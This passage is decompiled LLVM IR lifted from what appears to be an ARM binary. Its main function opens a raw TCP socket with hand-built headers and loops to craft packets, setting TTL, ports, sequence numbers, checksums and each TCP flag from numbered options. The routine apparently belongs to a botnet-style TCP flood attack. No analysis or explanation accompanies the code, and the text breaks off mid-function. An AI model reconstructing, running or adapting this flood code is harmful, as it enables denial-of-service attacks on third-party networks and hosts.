  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bb3c, { 1, 0 }
  uselistorder label %dec_label_pc_bb2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b888, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b858, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b794, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b774, { 1, 0 }
  uselistorder label %dec_label_pc_b750, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b700, { 1, 0 }
  uselistorder label %dec_label_pc_b6e4, { 1, 0 }
}

define i32 @function_bc74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bc74:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bc74 = load i32, i32* @sb, align 4
  %v24_bc74 = load i32, i32* @fp, align 4
  %v27_bc74 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bc90 = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_bc94 = load i32, i32* @r5, align 4
  store i32 %v0_bc94, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r4, align 4
  store i32 %v0_bca4, i32* %r0.global-to-local, align 4
  %v5_bca8 = inttoptr i32 %v0_bc94 to i32*
  %v6_bca8 = call i32 @function_a45c(i32 %v0_bca4, i32* %v5_bca8, i32 2, i32 0)
  %v1_bcb4 = urem i32 %v6_bca8, 256
  store i32 %v1_bcb4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  %v0_bcc4 = load i32, i32* @r4, align 4
  store i32 %v0_bcc4, i32* %r0.global-to-local, align 4
  %v6_bccc = inttoptr i32 %v0_bcc0 to i32*
  %v7_bccc = call i32 @function_a45c(i32 %v0_bcc4, i32* %v6_bccc, i32 3, i32 65535)
  %v0_bcd0 = load i32, i32* @r5, align 4
  store i32 %v0_bcd0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bccc, i32* %sb.global-to-local, align 4
  %v0_bce0 = load i32, i32* @r4, align 4
  store i32 %v0_bce0, i32* %r0.global-to-local, align 4
  %v4_bce4 = inttoptr i32 %v0_bcd0 to i32*
  %v5_bce4 = call i32 @function_a45c(i32 %v0_bce0, i32* %v4_bce4, i32 4, i32 64)
  %v1_bcec = urem i32 %v5_bce4, 256
  store i32 %v1_bcec, i32* %ip.global-to-local, align 4
  %v0_bcf0 = load i32, i32* @r5, align 4
  store i32 %v0_bcf0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bcfc = load i32, i32* @r4, align 4
  store i32 %v0_bcfc, i32* %r0.global-to-local, align 4
  %v6_bd04 = inttoptr i32 %v0_bcf0 to i32*
  %v7_bd04 = call i32 @function_a45c(i32 %v0_bcfc, i32* %v6_bd04, i32 5, i32 0)
  %v1_bd10 = urem i32 %v7_bd04, 256
  store i32 %v1_bd10, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bd1c = load i32, i32* @r5, align 4
  store i32 %v0_bd1c, i32* %r1.global-to-local, align 4
  %v0_bd20 = load i32, i32* @r4, align 4
  store i32 %v0_bd20, i32* %r0.global-to-local, align 4
  %v5_bd28 = inttoptr i32 %v0_bd1c to i32*
  %v6_bd28 = call i32 @function_a45c(i32 %v0_bd20, i32* %v5_bd28, i32 6, i32 65535)
  %v0_bd30 = load i32, i32* @r5, align 4
  store i32 %v0_bd30, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bd28, i32* @r6, align 4
  %v0_bd40 = load i32, i32* @r4, align 4
  store i32 %v0_bd40, i32* %r0.global-to-local, align 4
  %v4_bd44 = inttoptr i32 %v0_bd30 to i32*
  %v5_bd44 = call i32 @function_a45c(i32 %v0_bd40, i32* %v4_bd44, i32 7, i32 65535)
  %v0_bd4c = load i32, i32* @r5, align 4
  store i32 %v0_bd4c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bd44, i32* @sl, align 4
  %v0_bd5c = load i32, i32* @r4, align 4
  store i32 %v0_bd5c, i32* %r0.global-to-local, align 4
  %v4_bd60 = inttoptr i32 %v0_bd4c to i32*
  %v5_bd60 = call i32 @function_a45c(i32 %v0_bd5c, i32* %v4_bd60, i32 17, i32 65535)
  %v0_bd6c = load i32, i32* @r5, align 4
  store i32 %v0_bd6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bd78 = load i32, i32* @r4, align 4
  store i32 %v0_bd78, i32* %r0.global-to-local, align 4
  %v5_bd7c = inttoptr i32 %v0_bd6c to i32*
  %v6_bd7c = call i32 @function_a45c(i32 %v0_bd78, i32* %v5_bd7c, i32 18, i32 65535)
  %v0_bd80 = load i32, i32* @r5, align 4
  store i32 %v0_bd80, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd90 = load i32, i32* @r4, align 4
  store i32 %v0_bd90, i32* %r0.global-to-local, align 4
  %v5_bd94 = inttoptr i32 %v0_bd80 to i32*
  %v6_bd94 = call i32 @function_a45c(i32 %v0_bd90, i32* %v5_bd94, i32 11, i32 0)
  %v0_bd98 = load i32, i32* @r5, align 4
  store i32 %v0_bd98, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bda8 = load i32, i32* @r4, align 4
  store i32 %v0_bda8, i32* %r0.global-to-local, align 4
  %v5_bdac = inttoptr i32 %v0_bd98 to i32*
  %v6_bdac = call i32 @function_a45c(i32 %v0_bda8, i32* %v5_bdac, i32 12, i32 1)
  %v0_bdb0 = load i32, i32* @r5, align 4
  store i32 %v0_bdb0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bdc0 = load i32, i32* @r4, align 4
  store i32 %v0_bdc0, i32* %r0.global-to-local, align 4
  %v5_bdc4 = inttoptr i32 %v0_bdb0 to i32*
  %v6_bdc4 = call i32 @function_a45c(i32 %v0_bdc0, i32* %v5_bdc4, i32 13, i32 0)
  %v0_bdc8 = load i32, i32* @r5, align 4
  store i32 %v0_bdc8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bdd8 = load i32, i32* @r4, align 4
  store i32 %v0_bdd8, i32* %r0.global-to-local, align 4
  %v5_bddc = inttoptr i32 %v0_bdc8 to i32*
  %v6_bddc = call i32 @function_a45c(i32 %v0_bdd8, i32* %v5_bddc, i32 14, i32 0)
  %v0_bde0 = load i32, i32* @r5, align 4
  store i32 %v0_bde0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bdf0 = load i32, i32* @r4, align 4
  store i32 %v0_bdf0, i32* %r0.global-to-local, align 4
  %v5_bdf4 = inttoptr i32 %v0_bde0 to i32*
  %v6_bdf4 = call i32 @function_a45c(i32 %v0_bdf0, i32* %v5_bdf4, i32 15, i32 0)
  %v0_bdf8 = load i32, i32* @r5, align 4
  store i32 %v0_bdf8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be08 = load i32, i32* @r4, align 4
  store i32 %v0_be08, i32* %r0.global-to-local, align 4
  %v5_be0c = inttoptr i32 %v0_bdf8 to i32*
  %v6_be0c = call i32 @function_a45c(i32 %v0_be08, i32* %v5_be0c, i32 16, i32 0)
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 %v0_be10, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_be20 = load i32, i32* @r4, align 4
  store i32 %v0_be20, i32* %r0.global-to-local, align 4
  %v5_be24 = inttoptr i32 %v0_be10 to i32*
  %v6_be24 = call i32 @function_a45c(i32 %v0_be20, i32* %v5_be24, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_be34 = load i32, i32* @r5, align 4
  store i32 %v0_be34, i32* %r1.global-to-local, align 4
  %v0_be38 = load i32, i32* @r4, align 4
  store i32 %v0_be38, i32* %r0.global-to-local, align 4
  %v4_be3c = inttoptr i32 %v0_be34 to i32*
  %v5_be3c = call i32 @function_a45c(i32 %v0_be38, i32* %v4_be3c, i32 1, i32 1)
  %v2_be48 = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_be48, i32* %r3.global-to-local, align 4
  %v1_be4c = urem i32 %v5_be3c, 256
  store i32 %v1_be4c, i32* %ip.global-to-local, align 4
  %v0_be50 = load i32, i32* @r5, align 4
  store i32 %v0_be50, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r4, align 4
  store i32 %v0_be58, i32* %r0.global-to-local, align 4
  %v5_be60 = inttoptr i32 %v0_be50 to i32*
  %v6_be60 = call i32 @function_a3f0(i32 %v0_be58, i32* %v5_be60, i32 25, i32 %v2_be48, i32 %v1_be4c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_be74 = call i32 @function_13940(i32 2, i32 3, i32 6)
  store i32 %v3_be74, i32* %r0.global-to-local, align 4
  %v7_be78 = icmp eq i32 %v3_be74, -1
  store i1 %v7_be78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be78, label %dec_label_pc_c340, label %dec_label_pc_be84

dec_label_pc_be84:                                ; preds = %dec_label_pc_bc74
  store i32 1, i32* %stack_var_-44, align 4
  %v6_be8c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_be8c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bea0 = call i32 @function_138fc(i32 %v3_be74, i32 0, i32 3, i32 %v6_be8c, i32 4)
  store i32 %v5_bea0, i32* %r0.global-to-local, align 4
  %v7_bea4 = icmp eq i32 %v5_bea0, -1
  store i1 %v7_bea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bea4, label %dec_label_pc_c338, label %dec_label_pc_beac

dec_label_pc_beac:                                ; preds = %dec_label_pc_be84
  %v0_beac = load i32, i32* %sb.global-to-local, align 4
  %v3_beac = mul i32 %v0_beac, 65536
  store i32 %v3_beac, i32* @r5, align 4
  %v0_beb0 = load i32, i32* @r6, align 4
  %v0_beb4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bebc = urem i32 %v0_beac, 65536
  store i32 %v3_bebc, i32* %r1.global-to-local, align 4
  %v3_bec0 = urem i32 %v0_beb0, 65536
  store i32 %v3_bec0, i32* %r2.global-to-local, align 4
  %v3_bec4 = urem i32 %v0_beb4, 65536
  store i32 %v3_bec4, i32* %r3.global-to-local, align 4
  %v0_bec8 = load i32, i32* @r7, align 4
  %v2_bec8 = icmp eq i32 %v0_bec8, 0
  store i1 %v2_bec8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bec8, label %dec_label_pc_c34c, label %dec_label_pc_bee0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_beac
  %v3_bee4 = mul i32 %v6_be24, 65536
  %v1_bee8 = add i32 %v3_bee4, 2621440
  store i32 %v1_bee8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_beb0, 256
  %v3_bf0c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_beb4, 256
  %v3_bf10 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_beb0, 256
  %v4_bf14 = urem i32 %tmp61, 256
  %v5_bf14 = or i32 %v4_bf14, %v3_bf0c
  store i32 %v5_bf14, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_beb4, 256
  %v4_bf18 = urem i32 %tmp62, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf10
  store i32 %v5_bf18, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bee8, 256
  %v3_bf2c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_beac, 256
  %v3_bf30 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bd60, 256
  %v3_bf34 = and i32 %tmp65, 65280
  %v1_bf38 = urem i32 %v6_bd94, 2
  %v1_bf3c = urem i32 %v6_bdac, 2
  %tmp66 = udiv i32 %v5_bd60, 256
  %v4_bf40 = urem i32 %tmp66, 256
  %v5_bf40 = or i32 %v4_bf40, %v3_bf34
  %v4_bf44 = udiv i32 %v1_bee8, 16777216
  %v5_bf44 = or i32 %v3_bf2c, %v4_bf44
  store i32 %v5_bf44, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_beac, 256
  %v4_bf48 = urem i32 %tmp67, 256
  %v5_bf48 = or i32 %v4_bf48, %v3_bf30
  store i32 %v5_bf48, i32* @fp, align 4
  %v1_bf64 = urem i32 %v6_bdc4, 2
  store i32 %v1_bf64, i32* %r2.global-to-local, align 4
  %v1_bf68 = urem i32 %v6_bddc, 2
  store i32 %v1_bf68, i32* %r3.global-to-local, align 4
  %v1_bf6c = urem i32 %v6_bdf4, 2
  store i32 %v1_bf6c, i32* %ip.global-to-local, align 4
  %v1_bf70 = urem i32 %v6_be0c, 2
  store i32 %v1_bf70, i32* %r0.global-to-local, align 4
  %v1_bf74 = urem i32 %v6_bdc4, 256
  store i32 %v1_bf74, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bca8, 16777216
  %v4_bfe8 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bce4, 16777216
  %v4_bff4 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bf3c
  %v4_c060 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bf64
  %v4_c07c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bf68
  %v4_c090 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bf6c
  %v3_c0a4 = and i32 %tmp74, 2
  %v2_c0c8 = icmp eq i32 %v1_bf74, 0
  %v1_bff0 = trunc i32 %v4_bfe8 to i8
  %extract.t = trunc i32 %v4_bff4 to i8
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %bb70, %dec_label_pc_bee0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bfa0 = call i32 @function_144a8(i32 1510, i32 1)
  store i32 %v2_bfa0, i32* %r0.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @r4, align 4
  %v5_bfa8 = mul i32 %v2_bfa8, 4
  %v6_bfa8 = add i32 %v5_bfa8, %v2_bc90
  %v7_bfa8 = inttoptr i32 %v6_bfa8 to i32*
  store i32 %v2_bfa0, i32* %v7_bfa8, align 4
  %v3_bfac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfac, i32* %r2.global-to-local, align 4
  %v5_bfb4 = mul i32 %v3_bfac, 24
  %v1_bfb8 = load i32, i32* @r8, align 4
  %v2_bfb8 = add i32 %v1_bfb8, %v5_bfb4
  store i32 %v2_bfb8, i32* %r1.global-to-local, align 4
  store i32 %v2_bc90, i32* %r3.global-to-local, align 4
  %v4_bfc0 = mul i32 %v3_bfac, 4
  %v5_bfc0 = add i32 %v4_bfc0, %v2_bc90
  %v6_bfc0 = inttoptr i32 %v5_bfc0 to i32*
  %v7_bfc0 = load i32, i32* %v6_bfc0, align 4
  store i32 %v7_bfc0, i32* @r5, align 4
  %v1_bfc4 = inttoptr i32 %v7_bfc0 to i8*
  %v2_bfc4 = load i8, i8* %v1_bfc4, align 1
  %tmp75 = urem i8 %v2_bfc4, 16
  %v1_bfc8 = zext i8 %tmp75 to i32
  %v1_bfcc = or i32 %v1_bfc8, 64
  store i32 %v1_bfcc, i32* %r3.global-to-local, align 4
  %v1_bfd0 = trunc i32 %v1_bfcc to i8
  store i8 %v1_bfd0, i8* %v1_bfc4, align 1
  %v0_bfd4 = load i32, i32* @r5, align 4
  %v1_bfd4 = inttoptr i32 %v0_bfd4 to i8*
  %v2_bfd4 = load i8, i8* %v1_bfd4, align 1
  %v1_bfd8 = and i8 %v2_bfd4, -16
  %v1_bfdc = or i8 %v1_bfd8, 5
  store i32 %v1_bd10, i32* %ip.global-to-local, align 4
  store i8 %v1_bfdc, i8* %v1_bfd4, align 1
  store i32 %v4_bfe8, i32* %r0.global-to-local, align 4
  %v0_bfec = load i32, i32* %ip.global-to-local, align 4
  %v2_bfec = icmp eq i32 %v0_bfec, 0
  store i1 %v2_bfec, i1* %cpsr_z.global-to-local, align 1
  %v2_bff0 = load i32, i32* @r5, align 4
  %v3_bff0 = add i32 %v2_bff0, 1
  %v4_bff0 = inttoptr i32 %v3_bff0 to i8*
  store i8 %v1_bff0, i8* %v4_bff0, align 1
  store i32 %v4_bff4, i32* %r2.global-to-local, align 4
  %v0_bff8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bff8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf94
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bffc = load i32, i32* @r5, align 4
  %v4_bffc = add i32 %v3_bffc, 6
  %v5_bffc = inttoptr i32 %v4_bffc to i16*
  store i16 64, i16* %v5_bffc, align 2
  %v0_c004.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_c004.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf94, %bb
  %v0_c004.off0 = phi i8 [ %extract.t, %dec_label_pc_bf94 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c004 = load i32, i32* @r5, align 4
  %v3_c004 = add i32 %v2_c004, 8
  %v4_c004 = inttoptr i32 %v3_c004 to i8*
  store i8 %v0_c004.off0, i8* %v4_c004, align 1
  %v0_c008 = load i32, i32* %r3.global-to-local, align 4
  %v1_c008 = trunc i32 %v0_c008 to i8
  %v2_c008 = load i32, i32* @r5, align 4
  %v3_c008 = add i32 %v2_c008, 9
  %v4_c008 = inttoptr i32 %v3_c008 to i8*
  store i8 %v1_c008, i8* %v4_c008, align 1
  store i32 %v6_be60, i32* %ip.global-to-local, align 4
  %v1_c010 = load i32, i32* @r5, align 4
  %v2_c010 = add i32 %v1_c010, 12
  %v3_c010 = inttoptr i32 %v2_c010 to i32*
  store i32 %v6_be60, i32* %v3_c010, align 4
  %v0_c014 = load i32, i32* %r1.global-to-local, align 4
  %v1_c014 = add i32 %v0_c014, 16
  %v2_c014 = inttoptr i32 %v1_c014 to i32*
  %v3_c014 = load i32, i32* %v2_c014, align 4
  store i32 %v3_c014, i32* %r3.global-to-local, align 4
  %v0_c018 = load i32, i32* @sb, align 4
  %v1_c018 = trunc i32 %v0_c018 to i16
  %v2_c018 = load i32, i32* @r5, align 4
  %v3_c018 = add i32 %v2_c018, 2
  %v4_c018 = inttoptr i32 %v3_c018 to i16*
  store i16 %v1_c018, i16* %v4_c018, align 2
  %v0_c01c = load i32, i32* @fp, align 4
  %v1_c01c = trunc i32 %v0_c01c to i16
  %v2_c01c = load i32, i32* @r5, align 4
  %v3_c01c = add i32 %v2_c01c, 4
  %v4_c01c = inttoptr i32 %v3_c01c to i16*
  store i16 %v1_c01c, i16* %v4_c01c, align 2
  %v0_c020 = load i32, i32* %r3.global-to-local, align 4
  %v1_c020 = load i32, i32* @r5, align 4
  %v2_c020 = add i32 %v1_c020, 16
  %v3_c020 = inttoptr i32 %v2_c020 to i32*
  store i32 %v0_c020, i32* %v3_c020, align 4
  %v0_c024 = load i32, i32* @r6, align 4
  %v1_c024 = trunc i32 %v0_c024 to i16
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 20
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 %v1_c024, i16* %v4_c024, align 2
  %v0_c028 = load i32, i32* @r5, align 4
  %v1_c028 = add i32 %v0_c028, 20
  store i32 %v1_c028, i32* @r4, align 4
  %v1_c02c = add i32 %v0_c028, 32
  %v2_c02c = inttoptr i32 %v1_c02c to i8*
  %v3_c02c = load i8, i8* %v2_c02c, align 1
  %v4_c02c = zext i8 %v3_c02c to i32
  store i32 %v4_c02c, i32* %r3.global-to-local, align 4
  %v1_c030 = add i32 %v0_c028, 33
  %v2_c030 = inttoptr i32 %v1_c030 to i8*
  %v3_c030 = load i8, i8* %v2_c030, align 1
  %v4_c030 = zext i8 %v3_c030 to i32
  store i32 %v1_bf38, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_c02c, 16
  %v1_c038 = zext i8 %tmp76 to i32
  %v1_c03c = or i32 %v1_c038, 80
  store i32 %v1_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = and i32 %v4_c030, 223
  store i32 %v1_c040, i32* %r2.global-to-local, align 4
  %v1_c044 = trunc i32 %v1_c03c to i8
  store i8 %v1_c044, i8* %v2_c02c, align 1
  %v0_c048 = load i32, i32* %r2.global-to-local, align 4
  %v1_c048 = load i32, i32* %r0.global-to-local, align 4
  %v4_c048 = mul i32 %v1_c048, 32
  %v5_c048 = or i32 %v4_c048, %v0_c048
  store i32 %v5_c048, i32* %r2.global-to-local, align 4
  store i32 %v5_bf40, i32* %r1.global-to-local, align 4
  %v1_c050 = trunc i32 %v5_c048 to i8
  %v2_c050 = load i32, i32* @r4, align 4
  %v3_c050 = add i32 %v2_c050, 13
  %v4_c050 = inttoptr i32 %v3_c050 to i8*
  store i8 %v1_c050, i8* %v4_c050, align 1
  %v0_c054 = load i32, i32* @r4, align 4
  %v1_c054 = add i32 %v0_c054, 13
  %v2_c054 = inttoptr i32 %v1_c054 to i8*
  %v3_c054 = load i8, i8* %v2_c054, align 1
  %v4_c054 = zext i8 %v3_c054 to i32
  store i32 %v1_bf3c, i32* %r2.global-to-local, align 4
  %v1_c05c = and i32 %v4_c054, 239
  %v5_c060 = or i32 %v1_c05c, %v4_c060
  store i32 %v5_c060, i32* %r3.global-to-local, align 4
  %v0_c064 = load i32, i32* %r1.global-to-local, align 4
  %v2_c064 = add i32 %v0_c054, 4
  %v3_c064 = inttoptr i32 %v2_c064 to i32*
  store i32 %v0_c064, i32* %v3_c064, align 4
  %v0_c068 = load i32, i32* @sl, align 4
  %v1_c068 = trunc i32 %v0_c068 to i16
  %v2_c068 = load i32, i32* @r4, align 4
  %v3_c068 = add i32 %v2_c068, 2
  %v4_c068 = inttoptr i32 %v3_c068 to i16*
  store i16 %v1_c068, i16* %v4_c068, align 2
  %v0_c06c = load i32, i32* %r3.global-to-local, align 4
  %v1_c06c = trunc i32 %v0_c06c to i8
  %v2_c06c = load i32, i32* @r4, align 4
  %v3_c06c = add i32 %v2_c06c, 13
  %v4_c06c = inttoptr i32 %v3_c06c to i8*
  store i8 %v1_c06c, i8* %v4_c06c, align 1
  %v0_c070 = load i32, i32* @r4, align 4
  %v1_c070 = add i32 %v0_c070, 13
  %v2_c070 = inttoptr i32 %v1_c070 to i8*
  %v3_c070 = load i8, i8* %v2_c070, align 1
  %v4_c070 = zext i8 %v3_c070 to i32
  store i32 %v1_bf64, i32* %r3.global-to-local, align 4
  %v1_c078 = and i32 %v4_c070, 247
  %v5_c07c = or i32 %v1_c078, %v4_c07c
  store i32 %v5_c07c, i32* %r2.global-to-local, align 4
  %v1_c080 = trunc i32 %v5_c07c to i8
  store i8 %v1_c080, i8* %v2_c070, align 1
  %v0_c084 = load i32, i32* @r4, align 4
  %v1_c084 = add i32 %v0_c084, 13
  %v2_c084 = inttoptr i32 %v1_c084 to i8*
  %v3_c084 = load i8, i8* %v2_c084, align 1
  %v4_c084 = zext i8 %v3_c084 to i32
  store i32 %v1_bf68, i32* %ip.global-to-local, align 4
  %v1_c08c = and i32 %v4_c084, 251
  %v5_c090 = or i32 %v1_c08c, %v4_c090
  store i32 %v5_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = trunc i32 %v5_c090 to i8
  store i8 %v1_c094, i8* %v2_c084, align 1
  %v0_c098 = load i32, i32* @r4, align 4
  %v1_c098 = add i32 %v0_c098, 13
  %v2_c098 = inttoptr i32 %v1_c098 to i8*
  %v3_c098 = load i8, i8* %v2_c098, align 1
  %v4_c098 = zext i8 %v3_c098 to i32
  store i32 %v1_bf6c, i32* %r0.global-to-local, align 4
  %v1_c0a0 = and i32 %v4_c098, 253
  %v4_c0a4 = or i32 %v1_c0a0, %v3_c0a4
  store i32 %v4_c0a4, i32* %r2.global-to-local, align 4
  %v1_c0a8 = trunc i32 %v4_c0a4 to i8
  store i8 %v1_c0a8, i8* %v2_c098, align 1
  %v0_c0ac = load i32, i32* @r4, align 4
  %v1_c0ac = add i32 %v0_c0ac, 13
  %v2_c0ac = inttoptr i32 %v1_c0ac to i8*
  %v3_c0ac = load i8, i8* %v2_c0ac, align 1
  %v4_c0ac = zext i8 %v3_c0ac to i32
  store i32 %v1_bf70, i32* %r1.global-to-local, align 4
  %v1_c0b4 = and i32 %v4_c0ac, 254
  %v2_c0b8 = or i32 %v1_c0b4, %v1_bf70
  store i32 %v2_c0b8, i32* %r3.global-to-local, align 4
  %v1_c0bc = trunc i32 %v2_c0b8 to i8
  store i8 %v1_c0bc, i8* %v2_c0ac, align 1
  %v0_c0c0 = call i32 @function_f700()
  %v1_c0c0 = trunc i32 %v0_c0c0 to i16
  store i32 %v0_c0c0, i32* %r0.global-to-local, align 4
  store i32 %v1_bf74, i32* %r2.global-to-local, align 4
  store i1 %v2_c0c8, i1* %cpsr_z.global-to-local, align 1
  %v3_c0d4.pre = load i32, i32* @r4, align 4
  br i1 %v2_c0c8, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_c0cc = add i32 %v3_c0d4.pre, 13
  %v3_c0cc = inttoptr i32 %v2_c0cc to i8*
  %v4_c0cc = load i8, i8* %v3_c0cc, align 1
  %v5_c0cc = zext i8 %v4_c0cc to i32
  %v2_c0d0 = or i32 %v5_c0cc, 8
  store i32 %v2_c0d0, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_c0d4 = add i32 %v3_c0d4.pre, 14
  %v5_c0d4 = inttoptr i32 %v4_c0d4 to i16*
  store i16 %v1_c0c0, i16* %v5_c0d4, align 2
  store i32 %v6_be24, i32* %r1.global-to-local, align 4
  %v0_c0dc = load i32, i32* @r5, align 4
  %v1_c0dc = add i32 %v0_c0dc, 40
  store i32 %v1_c0dc, i32* %r0.global-to-local, align 4
  br i1 %v2_c0c8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_c0e0 = load i32, i32* @r3, align 4
  %v2_c0e0 = trunc i32 %v1_c0e0 to i8
  %v3_c0e0 = load i32, i32* @r4, align 4
  %v4_c0e0 = add i32 %v3_c0e0, 13
  %v5_c0e0 = inttoptr i32 %v4_c0e0 to i8*
  store i8 %v2_c0e0, i8* %v5_c0e0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_c0e4 = inttoptr i32 %v1_c0dc to i16*
  %v3_c0e4 = call i32 @function_f900(i16* %v2_c0e4, i32 %v6_be24)
